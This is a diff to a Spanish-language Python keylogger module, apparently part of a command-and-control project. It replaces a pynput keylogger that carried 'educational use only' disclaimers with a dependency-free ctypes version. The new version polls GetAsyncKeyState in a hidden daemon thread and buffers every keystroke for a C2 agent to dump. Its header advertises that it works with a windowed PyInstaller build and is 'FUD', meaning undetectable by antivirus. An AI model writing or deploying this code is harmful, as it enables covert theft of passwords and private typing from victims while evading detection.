@@ -1,193 +1,100 @@
 """
-Módulo Keylogger - C2 Project
-==============================
-Captura teclas presionadas para fines educativos.
-USAR ÚNICAMENTE EN ENTORNOS CONTROLADOS Y AUTORIZADOS.
-
-Nota: Este módulo solo funciona en Windows y Linux con X11.
+╔══════════════════════════════════════════════════════════════╗
+║     KEYLOGGER NATIVO - ctypes / Win32 (SIN DEPENDENCIAS)     ║
+╚══════════════════════════════════════════════════════════════╝
+Implementación pura en ctypes usando GetAsyncKeyState.
+No requiere pynput ni ninguna librería externa.
+Compatible con PyInstaller --windowed (FUD).
 """
-
+import ctypes
 import threading
 import time
-import os
+import platform
 from datetime import datetime
 
-try:
-    from pynput import keyboard
-    PYNPUT_AVAILABLE = True
-except ImportError:
-    PYNPUT_AVAILABLE = False
-    print("[!] pynput no instalado. Instala con: pip install pynput")
+# Mapa de VK Codes a caracteres legibles
+VK_MAP = {
+    0x08: '[BS]', 0x09: '[TAB]', 0x0D: '[ENTER]\n', 0x1B: '[ESC]',
+    0x20: ' ', 0x2E: '[DEL]', 0x25: '[LEFT]', 0x26: '[UP]',
+    0x27: '[RIGHT]', 0x28: '[DOWN]', 0x2C: '[PRTSC]',
+    0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]', 0xA2: '[LCTRL]',
+    0xA3: '[RCTRL]', 0xA4: '[LALT]', 0xA5: '[RALT]',
+    **{i: chr(i) for i in range(0x30, 0x5B)},  # 0-9, A-Z
+    **{i: chr(i + 32) for i in range(0x41, 0x5B)},  # a-z (lowercase)
+}
+
+# Estado del keylogger
+_buffer = []
+_active = False
+_thread = None
+_lock = threading.Lock()
+_prev_states = {}
 
 
-class Keylogger:
-    """
-    Keylogger básico que captura teclas presionadas.
-    Solo para uso educativo en entornos controlados.
-    """
-    
-    def __init__(self, log_file: str = None):
-        """
-        Inicializa el keylogger.
-        
-        Args:
-            log_file: Archivo donde guardar los logs (opcional)
-        """
-        self.log_file = log_file or 'keylog.txt'
-        self.keys = []
-        self.running = False
-        self.listener = None
-        self.count = 0
-        self._lock = threading.Lock()
-    
-    def _on_press(self, key):
-        """Callback cuando se presiona una tecla"""
-        try:
-            # Tecla alfanumérica
-            if hasattr(key, 'char'):
-                self.keys.append(key.char)
-            else:
-                # Tecla especial
-                self.keys.append(f'[{str(key).replace("Key.", "")}]')
-            
-            self.count += 1
-            
-            # Guardar cada 10 teclas o si es Enter
-            if self.count >= 10 or key == keyboard.Key.enter:
-                self._save_log()
-                self.keys = []
-                self.count = 0
-                
-        except Exception as e:
-            print(f"[!] Error en keylogger: {e}")
-    
-    def _on_release(self, key):
-        """Callback cuando se suelta una tecla"""
-        if key == keyboard.Key.esc:
-            # Detener con ESC (solo para testing)
-            return False
-    
-    def _save_log(self):
-        """Guarda las teclas capturadas en el archivo"""
-        if not self.keys:
-            return
-        
-        with self._lock:
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            log_entry = f"[{timestamp}] {''.join(self.keys)}\n"
-            
-            try:
-                with open(self.log_file, 'a', encoding='utf-8') as f:
-                    f.write(log_entry)
-            except Exception as e:
-                print(f"[!] Error al guardar log: {e}")
-    
-    def start(self):
-        """Inicia el keylogger en un thread separado"""
-        if not PYNPUT_AVAILABLE:
-            print("[!] pynput no disponible. No se puede iniciar el keylogger.")
-            return False
-        
-        self.running = True
-        self.listener = keyboard.Listener(
-            on_press=self._on_press,
-            on_release=self._on_release
-        )
-        self.listener.start()
-        print(f"[+] Keylogger iniciado. Logs en: {os.path.abspath(self.log_file)}")
-        return True
-    
-    def stop(self):
-        """Detiene el keylogger"""
-        self.running = False
-        if self.listener:
-            self.listener.stop()
-        self._save_log()  # Guardar teclas restantes
-        print("[+] Keylogger detenido")
-    
-    def get_logs(self) -> str:
-        """Obtiene los logs capturados"""
-        try:
-            if os.path.exists(self.log_file):
-                with open(self.log_file, 'r', encoding='utf-8') as f:
-                    return f.read()
-        except:
-            pass
-        return ""
-    
-    def clear_logs(self):
-        """Limpia los logs"""
-        try:
-            if os.path.exists(self.log_file):
-                os.remove(self.log_file)
-                print("[+] Logs limpiados")
-        except Exception as e:
-            print(f"[!] Error al limpiar logs: {e}")
+def _keylog_worker():
+    """Worker residente: Sondeo continuo de GetAsyncKeyState"""
+    global _active, _buffer, _prev_states
+
+    user32 = ctypes.windll.user32
+
+    while _active:
+        # Detectar si hay mayúsculas
+        caps = user32.GetKeyState(0x14) & 1  # CAPS_LOCK
+        shift = user32.GetAsyncKeyState(0x10) & 0x8000  # SHIFT
+
+        for vk in range(8, 256):
+            state = user32.GetAsyncKeyState(vk) & 0x0001  # Flanco de bajada
+            if state:
+                char = None
+                if vk in VK_MAP:
+                    ch = VK_MAP[vk]
+                    # Manejar mayúsculas/minúsculas para letras
+                    if len(ch) == 1 and ch.isalpha():
+                        if (caps and not shift) or (not caps and shift):
+                            ch = ch.upper()
+                        else:
+                            ch = ch.lower()
+                    char = ch
+                else:
+                    char = f'[VK:{hex(vk)}]'
+
+                if char:
+                    timestamp = datetime.now().strftime('%H:%M:%S')
+                    with _lock:
+                        _buffer.append(f'[{timestamp}]{char}')
+
+        time.sleep(0.01)  # 10ms poll cycle
 
 
-class KeyloggerSimple:
-    """
-    Versión simple sin dependencias externas (solo Windows).
-    Usa ctypes para capturar teclas.
-    """
-    
-    def __init__(self):
-        self.running = False
-        self.keys = []
-        self.log_file = 'keylog_simple.txt'
-    
-    def start(self):
-        """Inicia keylogger simple (solo Windows)"""
-        import platform
-        if platform.system() != 'Windows':
-            print("[!] Keylogger simple solo funciona en Windows")
-            return False
-        
-        print("[+] Keylogger simple iniciado (Windows)")
-        self.running = True
-        # Implementación básica con ctypes
-        # Para producción, usar pynput
-        return True
-    
-    def stop(self):
-        self.running = False
-        print("[+] Keylogger simple detenido")
+def start() -> str:
+    """Inicia el keylogger en background."""
+    global _active, _thread, _buffer
+
+    if platform.system() != 'Windows':
+        return '[ERROR] Keylogger solo disponible en Windows'
+
+    if _active:
+        return '[*] Keylogger ya estaba activo'
+
+    _buffer = []
+    _active = True
+    _thread = threading.Thread(target=_keylog_worker, daemon=True)
+    _thread.start()
+    return '[+] Keylogger nativo activado (ctypes GetAsyncKeyState)'
 
 
-# Función helper para usar en el agente C2
-def start_keylogger(log_file: str = 'keylog.txt') -> Keylogger:
-    """
-    Helper para iniciar un keylogger.
-    
-    Returns:
-        Keylogger: Instancia del keylogger
-    """
-    kl = Keylogger(log_file)
-    kl.start()
-    return kl
+def dump() -> str:
+    """Devuelve y limpia el buffer actual del keylogger."""
+    global _buffer
+    with _lock:
+        captured = ''.join(_buffer)
+        _buffer = []
+    return captured if captured else '[*] No hay teclas capturadas aún.'
 
 
-# Ejemplo de uso
-if __name__ == '__main__':
-    print("=== Keylogger Educativo ===\n")
-    print("Presiona teclas (ESC para salir)")
-    print("Los logs se guardan en 'keylog.txt'\n")
-    
-    if not PYNPUT_AVAILABLE:
-        print("[!] pynput no instalado. Instalando temporalmente...")
-        print("    Ejecuta: pip install pynput")
-        exit(1)
-    
-    keylogger = Keylogger()
-    keylogger.start()
-    
-    try:
-        # Mantener ejecutando
-        while keylogger.running:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\n[!] Deteniendo keylogger...")
-        keylogger.stop()
-    
-    print(f"\nLogs capturados:")
-    print(keylogger.get_logs())
+def stop() -> str:
+    """Detiene el keylogger."""
+    global _active
+    _active = False
+    captured = dump()
+    return f'[+] Keylogger detenido.\n[*] Buffer final:\n{captured}'
